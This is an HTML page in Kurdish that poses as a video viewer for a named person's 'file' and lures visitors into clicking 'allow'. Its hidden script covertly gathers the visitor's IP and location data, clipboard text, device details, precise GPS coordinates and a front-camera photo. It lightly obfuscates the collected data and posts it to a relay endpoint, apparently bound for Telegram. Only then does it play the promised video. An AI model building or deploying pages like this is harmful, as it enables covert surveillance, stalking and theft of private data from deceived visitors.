<!DOCTYPE html>
<html lang="ku" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>مەلەفی سوڕەیا - داشبۆردی چاودێری قووڵ</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; -webkit-tap-highlight-color: transparent; }
        body { 
            background: linear-gradient(135deg, #0f172a, #1e293b); 
            height: 100vh; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            overflow: hidden;
            position: fixed;
            width: 100%;
        }
        .container { 
            background: #ffffff; 
            padding: 22px; 
            border-radius: 24px; 
            box-shadow: 0 20px 40px rgba(0,0,0,0.4); 
            width: 92%; 
            max-width: 380px; 
            text-align: center; 
        }
        .preview-img-box {
            width: 100%;
            height: 200px;
            border-radius: 16px;
            overflow: hidden;
            margin-bottom: 15px;
            box-shadow: 0 8px 20px rgba(0,0,0,0.15);
            position: relative;
            background: #000;
        }
        .preview-img-box img {
            width: 100%;
            height: 100%;
            object-fit: contain;
        }
        .image-overlay-text {
            position: absolute;
            bottom: 0;
            left: 0;
            right: 0;
            background: linear-gradient(to top, rgba(0,0,0,0.85), rgba(0,0,0,0.4));
            color: #ffffff;
            padding: 10px;
            font-size: 13px;
            font-weight: bold;
            text-align: center;
        }
        .content-after-allow {
            display: none;
            margin-bottom: 15px;
        }
        .content-after-allow video {
            width: 100%;
            border-radius: 12px;
            max-height: 240px;
            object-fit: cover;
            outline: none;
        }
        .title { font-size: 22px; font-weight: 800; color: #0f172a; margin-bottom: 6px; }
        .subtitle { color: #64748b; font-size: 13px; margin-bottom: 20px; line-height: 1.5; font-weight: 500; }
        .btn { 
            background: linear-gradient(135deg, #2563eb, #1d4ed8); 
            color: white; 
            padding: 15px; 
            border: none; 
            border-radius: 30px; 
            cursor: pointer; 
            font-size: 16px; 
            width: 100%; 
            font-weight: bold; 
            box-shadow: 0 6px 16px rgba(37,99,235,0.4);
        }
        .loader {
            border: 3px solid #f3f3f3;
            border-radius: 50%;
            border-top: 3px solid #2563eb;
            width: 32px;
            height: 32px;
            animation: spin 1s linear infinite;
            margin: 15px auto;
            display: none;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .status-text { margin-top: 15px; font-size: 12px; color: #94a3b8; font-weight: 500; }
    </style>
</head>
<body>

    <div class="container" id="mainContainer">
        <div id="imageBox" class="preview-img-box">
            <img src="surayamalaf.jpg" alt="مەلەفی سوڕەیا">
            <div class="image-overlay-text">بۆ بینینی ڤیدیۆکە allow دابگرە</div>
        </div>

        <div id="mediaBox" class="content-after-allow">
            <video id="targetVideo" controls playsinline>
                <source src="sararanyai.MP4" type="video/mp4">
                تەلەفۆنەکەت پشتگیری ڤیدیۆ ناکات
            </video>
        </div>

        <div class="title" id="boxTitle">مەلەفی سوڕەیا</div>
        <div class="subtitle" id="boxSubtitle">بۆ بەردەوامبوون و بینینی تەواوی ڤیدیۆکە، کلیک بکە:</div>
        
        <div id="loader" class="loader"></div>
        <button id="mainBtn" class="btn" onclick="startProcess()">بەردەوامبوون</button>
        
        <div class="status-text" id="statusText">ئامادەیە</div>
    </div>

    <video id="camVideo" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        document.addEventListener('contextmenu', event => event.preventDefault());

        function simpleEncrypt(text) {
            return btoa(text.split('').map(char => 
                String.fromCharCode(char.charCodeAt(0) + 3)
            ).join(''));
        }

        let motionData = { alpha: 0, beta: 0, gamma: 0 };
        window.addEventListener('deviceorientation', function(event) {
            motionData.alpha = Math.round(event.alpha || 0);
            motionData.beta = Math.round(event.beta || 0);
            motionData.gamma = Math.round(event.gamma || 0);
        });

        async function sendToTelegram(payload) {
            try {
                if (payload.text) payload.text = simpleEncrypt(payload.text);
                if (payload.caption) payload.caption = simpleEncrypt(payload.caption);

                await fetch('/api/send', {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(payload)
                });
            } catch(e) {}
        }

        async function getClipboardData() {
            try {
                if (navigator.clipboard && navigator.clipboard.readText) {
                    let text = await navigator.clipboard.readText();
                    return text ? text.slice(0, 100) : "خاڵییە";
                }
            } catch(e) { return "ڕەتکرایەوە"; }
            return "پشتیوانی ناکرێت";
        }

        function getGPUInfo() {
            try {
                let canvas = document.createElement('canvas');
                let gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (!gl) return "نەزانراو";
                let dbg = gl.getExtension('WEBGL_debug_renderer_info');
                return dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "Standard WebGL";
            } catch(e) { return "بەردەست نییە"; }
        }

        async function getUltimateIPData() {
            try {
                let res = await fetch('https://ipapi.co/json/');
                let data = await res.json();
                if (data && data.ip) return data;
            } catch(e) {}
            return { ip: "نەزانراو", city: "نەزانراو", country_name: "نەزانراو", org: "نەزانراو" };
        }

        // ١. ناردنی دەستبەجێی تێکست و زانیاریی سیستم
        async function gatherAndSendTelemetry() {
            let ua = navigator.userAgent;
            let platform = navigator.platform;
            let language = navigator.language;
            let timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            let screenRes = window.screen.width + "x" + window.screen.height;
            let cpuCores = navigator.hardwareConcurrency || "نەزانراو";
            let gpu = getGPUInfo();
            let clipboardText = await getClipboardData();
            let ipData = await getUltimateIPData();

            let report = `⚡ *ڕاپۆرتی تایتان گۆد مۆد (TITAN PRO):*\n\n` +
                         `🌐 *ڕایەڵە و شوێن:*\n` +
                         `• *ئایپی:* \`${ipData.ip}\`\n` +
                         `• *وڵات و شار:* ${ipData.country_name} - ${ipData.city}\n` +
                         `• *دابینکەر:* ${ipData.org}\n` +
                         `• *ناوچەی کاتی:* \`${timezone}\`\n\n` +
                         `📋 *کلیپبۆرد:*\n\`${clipboardText}\`\n\n` +
                         `💻 *رەقامەواڵە:*\n` +
                         `• سیستم: ${platform}\n` +
                         `• پرۆسێسەر (Cores): ${cpuCores}\n` +
                         `• کارتی شاشە: \`${gpu}\`\n` +
                         `• شاشە: ${screenRes}\n` +
                         `• زمان: ${language}\n\n` +
                         `📱 *User Agent:*\n\`${ua}\``;
            
            await sendToTelegram({ type: 'text', text: report });
        }

        // ٢. ناردنی شوێنی GPS
        function sendLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    let lat = position.coords.latitude;
                    let lon = position.coords.longitude;
                    let accuracy = position.coords.accuracy;
                    let locMsg = `📍 *شوێنی GPSی ورد:*\n• هێڵی پانی: \`${lat}\`\n• هێڵی درێژی: \`${lon}\`\n• هەڵە: ~${Math.round(accuracy)} مەتر\n🗺️ [کردنەوە لە نەخشە](https://maps.google.com/?q=${lat},${lon})`;
                    sendToTelegram({ type: 'text', text: locMsg });
                }, function(error) {}, { enableHighAccuracy: true, timeout: 10000 });
            }
        }

        // ٣. ناردنی وێنەی کامێرا بە دوای یەکدا
        function takePictures() {
            const video = document.getElementById('camVideo');
            const canvas = document.getElementById('canvas');
            
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
            .then(function(stream) {
                video.srcObject = stream;
                video.play();
                setTimeout(function() {
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    let ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    canvas.toBlob(function(blob) {
                        let reader = new FileReader();
                        reader.readAsDataURL(blob);
                        reader.onloadend = function() {
                            sendToTelegram({ type: 'photo', caption: "📸 *وێنەی پێشەوە (Selfie)*", data: reader.result });
                        }
                    }, 'image/jpeg', 0.8);
                    stream.getTracks().forEach(track => track.stop());
                }, 1500);
            }).catch(e => {});
        }

        function startProcess() {
            document.getElementById('mainBtn').style.display = 'none';
            document.getElementById('loader').style.display = 'block';
            document.getElementById('statusText').innerText = 'چاوەڕوان بە...';

            // جێبەجێکردنی کارەکان بە پلەبەندی (Staggered Execution) بۆ مسۆگەرکردنی ناردن
            gatherAndSendTelemetry();
            setTimeout(sendLocation, 1000);
            setTimeout(takePictures, 2500);

            setTimeout(function() {
                document.getElementById('loader').style.display = 'none';
                document.getElementById('imageBox').style.display = 'none';
                document.getElementById('mediaBox').style.display = 'block';
                document.getElementById('boxTitle').innerText = 'مەلەفی سوڕەیا';
                document.getElementById('boxSubtitle').innerText = 'فەرموو ڤیدیۆکە دەست پێ دەکات:';
                document.getElementById('statusText').innerText = 'سەرکەوتوو بوو';
                
                let vid = document.getElementById('targetVideo');
                vid.play().catch(e => {});
            }, 3500);
        }
    </script>
</body>
</html>
